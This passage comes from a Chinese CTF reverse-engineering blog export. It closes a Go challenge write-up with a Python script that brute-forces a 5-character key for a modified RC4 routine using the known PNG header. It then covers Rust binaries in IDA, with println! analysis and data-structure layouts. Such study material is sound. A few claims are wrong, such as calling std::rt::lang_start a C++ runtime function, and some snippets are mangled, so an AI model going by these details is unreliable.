src="/assets/Pasted%20image%2020250417170822.png"></p><p>根据<code>main_KeySizeError_Error</code>函数，我们可以判断程序使用的是 rc4 加密算法。</p><p><img src="/assets/Pasted%20image%2020250417170947.png"></p><p>这里程序要求我们输入密钥，但是我们完全不知道密钥。但是我们知道密钥的长度是 5 ，所以我们可以采取爆破的方法。这里我们加密的 flag 是一个 png 文件，所以我们可以知道 png 未被加密前的文件头，然后通过爆破加密直到加密后的文件头与我们 flag.png 的文件头相等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">enc,key</span>):    <br>  s=[]    <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        <br>    s.append(i)    <br>  t=[]    <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        <br>    t.append(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)]))    <br>  j=<span class="hljs-number">0</span>    <br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):        <br>    j=(j+s[i]+t[i])%<span class="hljs-number">256</span>        <br>    s[i],s[j]=s[j],s[i]    <br>  i=<span class="hljs-number">0</span>    <br>  j=<span class="hljs-number">0</span>    <br>  result=[]    <br>  <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):        <br>    i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span>        <br>    j=(j+s[i])%<span class="hljs-number">256</span>        <br>    s[i], s[j] = s[j], s[i]        <br>    x=(s[i]+s[j])%<span class="hljs-number">256</span>        <br>    result.append(enc[k]^s[x]^<span class="hljs-built_in">ord</span>(key[<span class="hljs-number">1</span>])^<span class="hljs-number">17</span>)<br><span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(product(Map,repeat=<span class="hljs-number">5</span>)):    <br>  key = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(i))    <br>  enc = [<span class="hljs-number">0x85</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x78</span>]    <br>  flag=rc4(enc,key)    <br>  <span class="hljs-keyword">if</span> flag==[<span class="hljs-number">137</span>, <span class="hljs-number">80</span>, <span class="hljs-number">78</span>, <span class="hljs-number">71</span>]:        <br>    <span class="hljs-built_in">print</span>(key)        <br>    exit()<br></code></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p>CTF 从 0 到 1<br><a href="https://xz.aliyun.com/news/8569?time__1311=n4Ix0D2GD=DtGQDkDlOIY0=L5AKR4d4wBggbD&u_atoken=354161e2892fae430db293c849bfedaa&u_asig=1a0c39d417425347684577622e0048">文章 - 【技术推荐】正向角度看Go逆向 - 先知社区</a><br><a href="https://forum.butian.net/share/1874">奇安信攻防社区-2022网鼎杯go逆向拾遗之路</a><br><a href="https://www.anquanke.com/post/id/218674#h2-11">Go二进制文件逆向分析从基础到进阶——Tips与实战案例-安全KER - 安全资讯平台</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 高级语言逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust逆向分析</title>
      <link href="/2025/07/01/ctf/re/rust/"/>
      <url>/2025/07/01/ctf/re/rust/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h2 id="print-宏逆向"><a href="#print-宏逆向" class="headerlink" title="print!宏逆向"></a><code>print!</code>宏逆向</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><code>print!</code>是 rust 中用于输出的宏，rust中的宏在编译阶段会展开成具体的代码，<code>print!</code>宏比较常见，展开后的代码比较复杂，学习分析<code>print</code>语句可以帮助理清程序逻辑。</p><p>除了<code>println!</code>宏外还有<code>print!</code>宏，它们的区别就是在编译时编译器会在<code>println!</code>所输出的内容后加一个<code>\n</code>。</p><h3 id="宏展开分析"><a href="#宏展开分析" class="headerlink" title="宏展开分析"></a>宏展开分析</h3><ul><li>示例代码</li></ul><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br></code></pre></td></tr></table></figure><p>我们将示例代码编译后，通过 ida 进行逆向。</p><blockquote><p>注：根据经验在逆向 rust 上，ida 9 要比其它版本好用的多。</p></blockquote><p>在<code>main</code>函数中通过<code>std::rt::lang_start</code>启动程序并调用用户定义的<code>demo::main</code>函数。<code>std::rt::lang_start</code>是 C++ 的运行时库函数，负责程序初始化，并最终调用用户的<code>main</code>函数。</p><p><img src="/assets/Pasted%20image%2020250325132216.png"></p><p>跟进<code>demo::main</code>函数。</p><p><code>core::fmt::Arguments::new_const(v0, &amp;off_55F08);</code>这行代码创建了一个格式化参数对象。它使用<code>v0</code>数组作为内存存储，并通过<code>off_55F08</code>指定的常量作为格式化字符串或数据。</p><p><code>v0</code>就是我们要输出的<code>hello world</code>。</p><p><img src="/assets/Pasted%20image%2020250325132818.png"></p><p><img src="/assets/Pasted%20image%2020250325132849.png"></p><p><code>std::io::stdio::_print();</code>这行代码将上述格式化参数传递给标准输出的打印函数，输出到屏幕。</p><p><img src="/assets/Pasted%20image%2020250325132613.png"></p><p>这段代码是 Rust 标准库中实现 <code>std::io::stdio::_print()</code> 函数的部分。它的主要作用是通过标准输出（STDOUT）将数据打印到屏幕。下面是这段代码的简要分析：</p><ol><li><p><strong>变量初始化</strong>：</p><ul><li><code>v8[0] = aStdout;</code> 和 <code>v8[1] = 6LL;</code> 初始化了一个数组 <code>v8</code>，其中 <code>aStdout</code> 可能是标准输出流的指针，6 代表输出的目标（例如 <code>STDOUT</code>）。</li></ul></li><li><p><strong>条件检查</strong>：</p><ul><li><p><code>if ( !v0 )</code> 这里的 <code>v0</code> 是一个字节值，通常用来表示一些状态信息。如果 <code>v0</code> 为 0，则进入打印过程。</p></li><li><p><code>if ( dword_5A1B0 != 3 )</code> 检查某个状态变量，可能涉及是否需要初始化一次锁机制。</p></li></ul></li><li><p><strong>初始化与格式化写入</strong>：</p><ul><li><p><code>v9 = &amp;std::io::stdio::STDOUT;</code> 获取标准输出流的指针。</p></li><li><p><code>v3 = &amp;v9;</code> 设置一个指向指针 <code>v9</code> 的指针 <code>v3</code>，这个指针最终会传递给 <code>write_fmt</code> 函数进行格式化写入。</p></li><li><p><code>&lt;&amp;std::io::stdio::Stdout as std::io::Write&gt;::write_fmt();</code> 这一行使用 <code>write_fmt</code> 来将格式化的数据写入标准输出（<code>STDOUT</code>）。</p></li></ul></li><li><p><strong>错误处理与 panic</strong>：</p><ul><li><p>如果发生错误（<code>v1</code> 非零），则进入错误处理部分。<code>v2</code> 数组中保存了格式化输出的参数。</p></li><li><p><code>core::panicking::panic_fmt();</code> 会触发 panic，抛出错误信息，通常在遇到无法恢复的错误时调用。</p></li></ul></li></ol><p><img src="/assets/Pasted%20image%2020250325132927.png"></p><p><img src="/assets/Pasted%20image%2020250405113420.png"></p><p><img src="/assets/Pasted%20image%2020250405113442.png"></p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="string、-str"><a href="#string、-str" class="headerlink" title="string、&amp;str"></a>string、&amp;str</h3><p><img src="/assets/Pasted%20image%2020250405113637.png"></p><p>string的布局与vector一致。</p><p><img src="/assets/Pasted%20image%2020250217000153.png"></p><p><img src="/assets/Pasted%20image%2020250217000333.png"></p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a><code>struct</code></h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>    name: <span class="hljs-type">String</span>,<br>    age: <span class="hljs-type">u8</span>,<br>&#125;<br><br><span class="hljs-comment">// A unit struct</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Unit</span>;<br><br><span class="hljs-comment">// A tuple struct</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Pair</span>(<span class="hljs-type">i32</span>, <span class="hljs-type">f32</span>);<br><br><span class="hljs-comment">// A struct with two fields</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> &#123;<br>    x: <span class="hljs-type">f32</span>,<br>    y: <span class="hljs-type">f32</span>,<br>&#125;<br><br><span class="hljs-comment">// Structs can be reused as fields of another struct</span><br><span class="hljs-meta">#[allow(dead_code)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Rectangle</span> &#123;<br>    <span class="hljs-comment">// A rectangle can be specified by where the top left and bottom right</span><br>    <span class="hljs-comment">// corners are in space.</span><br>    top_left: Point,<br>    bottom_right: Point,<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// Create struct with field init shorthand</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">name</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;Peter&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">age</span> = <span class="hljs-number">27</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">peter</span> = Person &#123; name, age &#125;;<br><br>    <span class="hljs-comment">// Print debug struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, peter);<br><br>    <span class="hljs-comment">// Instantiate a `Point`</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">point</span>: Point = Point &#123; x: <span class="hljs-number">10.3</span>, y: <span class="hljs-number">0.4</span> &#125;;<br><br>    <span class="hljs-comment">// Access the fields of the point</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;point coordinates: (&#123;&#125;, &#123;&#125;)&quot;</span>, point.x, point.y);<br><br>    <span class="hljs-comment">// Make a new point by using struct update syntax to use the fields of our</span><br>    <span class="hljs-comment">// other one</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">bottom_right</span> = Point &#123; x: <span class="hljs-number">5.2</span>, ..point &#125;;<br><br>    <span class="hljs-comment">// `bottom_right.y` will be the same as `point.y` because we used that field</span><br>    <span class="hljs-comment">// from `point`</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;second point: (&#123;&#125;, &#123;&#125;)&quot;</span>, bottom_right.x, bottom_right.y);<br><br>    <span class="hljs-comment">// Destructure the point using a `let` binding</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">Point</span> &#123; x: left_edge, y: top_edge &#125; = point;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">_rectangle</span> = Rectangle &#123;<br>        <span class="hljs-comment">// struct instantiation is an expression too</span><br>        top_left: Point &#123; x: left_edge, y: top_edge &#125;,<br>        bottom_right: bottom_right,<br>    &#125;;<br><br>    <span class="hljs-comment">// Instantiate a unit struct</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">_unit</span> = Unit;<br><br>    <span class="hljs-comment">// Instantiate a tuple struct</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">pair</span> = <span class="hljs-title function_ invoke__">Pair</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>);<br><br>    <span class="hljs-comment">// Access the fields of a tuple struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, pair.<span class="hljs-number">0</span>, pair.<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// Destructure a tuple struct</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">Pair</span>(integer, decimal) = pair;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, integer, decimal);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><p><img src="/assets/Pasted%20image%2020250217000230.png"></p><h3 id="vec"><a href="#vec" class="headerlink" title="vec"></a><code>vec</code></h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// Iterators can be collected into vectors</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">collected_iterator</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; = (<span class="hljs-number">0</span>..<span class="hljs-number">10</span>).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Collected (0..10) into: &#123;:?&#125;&quot;</span>, collected_iterator);<br><br>    <span class="hljs-comment">// The `vec!` macro can be used to initialize a vector</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">xs</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1i32</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Initial vector: &#123;:?&#125;&quot;</span>, xs);<br><br>    <span class="hljs-comment">// Insert new element at the end of the vector</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Push 4 into the vector&quot;</span>);<br>    xs.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Vector: &#123;:?&#125;&quot;</span>, xs);<br><br>    <span class="hljs-comment">// Error! Immutable vectors can&#x27;t grow</span><br>    <span class="hljs-comment">// collected_iterator.push(0);</span><br>    <span class="hljs-comment">// FIXME ^ Comment out this line</span><br><br>    <span class="hljs-comment">// The `len` method yields the number of elements currently stored in a vector</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Vector length: &#123;&#125;&quot;</span>, xs.<span class="hljs-title function_ invoke__">len</span>());<br><br>    <span class="hljs-comment">// Indexing is done using the square brackets (indexing starts at 0)</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Second element: &#123;&#125;&quot;</span>, xs[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">// `pop` removes the last element from the vector and returns it</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Pop last element: &#123;:?&#125;&quot;</span>, xs.<span class="hljs-title function_ invoke__">pop</span>());<br><br>    <span class="hljs-comment">// Out of bounds indexing yields a panic</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Fourth element: &#123;&#125;&quot;</span>, xs[<span class="hljs-number">3</span>]);<br>    <span class="hljs-comment">// FIXME ^ Comment out this line</span><br><br>    <span class="hljs-comment">// `Vector`s can be easily iterated over</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Contents of xs:&quot;</span>);<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">x</span> <span class="hljs-keyword">in</span> xs.<span class="hljs-title function_ invoke__">iter</span>() &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&gt; &#123;&#125;&quot;</span>, x);<br>    &#125;<br><br>    <span class="hljs-comment">// A `Vector` can also be iterated over while the iteration</span><br>    <span class="hljs-comment">// count is enumerated in a separate variable (`i`)</span><br>    <span class="hljs-keyword">for</span> (i, x) <span class="hljs-keyword">in</span> xs.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">enumerate</span>() &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;In position &#123;&#125; we have value &#123;&#125;&quot;</span>, i, x);<br>    &#125;<br><br>    <span class="hljs-comment">// Thanks to `iter_mut`, mutable `Vector`s can also be iterated</span><br>    <span class="hljs-comment">// over in a way that allows modifying each value</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">x</span> <span class="hljs-keyword">in</span> xs.<span class="hljs-title function_ invoke__">iter_mut</span>() &#123;<br>        *x *= <span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Updated vector: &#123;:?&#125;&quot;</span>, xs);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h3><p><img src="/assets/Pasted%20image%2020250217000115.png"></p><h3 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a><code>tuple</code></h3><p><img src="/assets/Pasted%20image%2020250217000058.png"></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Tuples can be used as function arguments and as return values</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">reverse</span>(pair: (<span class="hljs-type">i32</span>, <span class="hljs-type">bool</span>)) <span class="hljs-punctuation">-&gt;</span> (<span class="hljs-type">bool</span>, <span class="hljs-type">i32</span>) &#123;<br>    <span class="hljs-comment">// `let` can be used to bind the members of a tuple to variables</span><br>    <span class="hljs-keyword">let</span> (integer, boolean) = pair;<br><br>    (boolean, integer)<br>&#125;<br><br><span class="hljs-comment">// The following struct is for the activity.</span><br><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Matrix</span>(<span class="hljs-type">f32</span>, <span class="hljs-type">f32</span>, <span class="hljs-type">f32</span>, <span class="hljs-type">f32</span>);<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// A tuple with a bunch of different types</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">long_tuple</span> = (<span class="hljs-number">1u8</span>, <span class="hljs-number">2u16</span>, <span class="hljs-number">3u32</span>, <span class="hljs-number">4u64</span>,<br>                      -<span class="hljs-number">1i8</span>, -<span class="hljs-number">2i16</span>, -<span class="hljs-number">3i32</span>, -<span class="hljs-number">4i64</span>,<br>                      <span class="hljs-number">0.1f32</span>, <span class="hljs-number">0.2f64</span>,<br>                      <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-comment">// Values can be extracted from the tuple using tuple indexing</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;long tuple first value: &#123;&#125;&quot;</span>, long_tuple.<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;long tuple second value: &#123;&#125;&quot;</span>, long_tuple.<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// Tuples can be tuple members</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tuple_of_tuples</span> = ((<span class="hljs-number">1u8</span>, <span class="hljs-number">2u16</span>, <span class="hljs-number">2u32</span>), (<span class="hljs-number">4u64</span>, -<span class="hljs-number">1i8</span>), -<span class="hljs-number">2i16</span>);<br><br>    <span class="hljs-comment">// Tuples are printable</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;tuple of tuples: &#123;:?&#125;&quot;</span>, tuple_of_tuples);<br>    <br>    <span class="hljs-comment">// But long Tuples cannot be printed</span><br>    <span class="hljs-comment">// let too_long_tuple = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13);</span><br>    <span class="hljs-comment">// println!(&quot;too long tuple: &#123;:?&#125;&quot;, too_long_tuple);</span><br>    <span class="hljs-comment">// TODO ^ Uncomment the above 2 lines to see the compiler error</span><br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">pair</span> = (<span class="hljs-number">1</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair is &#123;:?&#125;&quot;</span>, pair);<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;the reversed pair is &#123;:?&#125;&quot;</span>, <span class="hljs-title function_ invoke__">reverse</span>(pair));<br><br>    <span class="hljs-comment">// To create one element tuples, the comma is required to tell them apart</span><br>    <span class="hljs-comment">// from a literal surrounded by parentheses</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;one element tuple: &#123;:?&#125;&quot;</span>, (<span class="hljs-number">5u32</span>,));<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;just an integer: &#123;:?&#125;&quot;</span>, (<span class="hljs-number">5u32</span>));<br><br>    <span class="hljs-comment">//tuples can be destructured to create bindings</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tuple</span> = (<span class="hljs-number">1</span>, <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-number">4.5</span>, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-keyword">let</span> (a, b, c, d) = tuple;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;, &#123;:?&#125;, &#123;:?&#125;, &#123;:?&#125;&quot;</span>, a, b, c, d);<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">matrix</span> = <span class="hljs-title function_ invoke__">Matrix</span>(<span class="hljs-number">1.1</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">2.1</span>, <span class="hljs-number">2.2</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, matrix);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Array-Slice"><a href="#Array-Slice" class="headerlink" title="Array_Slice"></a><code>Array_Slice</code></h3><p>数组分配在栈上，可以导致溢出攻击。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust">lex xs: [<span class="hljs-type">i32</span>;<span class="hljs-number">5</span>]=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br><br><span class="hljs-keyword">let</span> <span class="hljs-variable">ys</span>: [<span class="hljs-type">i32</span>;<span class="hljs-number">500</span>]=[<span class="hljs-number">0</span>,<span class="hljs-number">500</span>];<br></code></pre></td></tr></table></figure><p><img src="/assets/Pasted%20image%2020250405113840.png"></p><p>切片</p><p>rust 中的切片就是（数据地址，长度）</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">ys</span>:[<span class="hljs-type">i32</span>;<span class="hljs-number">500</span>]=[<span class="hljs-number">0</span>;<span class="hljs-number">500</span>];<br><span class="hljs-title function_ invoke__">analyze_slice</span>(&amp;ys[<span class="hljs-number">1</span>..<span class="hljs-number">4</span>]);<br></code></pre></td></tr></table></figure><p><img src="/assets/Pasted%20image%2020250405114017.png"></p><p><img src="/assets/Pasted%20image%2020250217000139.png"></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::mem;<br><br><span class="hljs-comment">// This function borrows a slice</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">analyze_slice</span>(slice: &amp;[<span class="hljs-type">i32</span>]) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;first element of the slice: &#123;&#125;&quot;</span>, slice[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;the slice has &#123;&#125; elements&quot;</span>, slice.<span class="hljs-title function_ invoke__">len</span>());<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// Fixed-size array (type signature is superfluous)</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">xs</span>: [<span 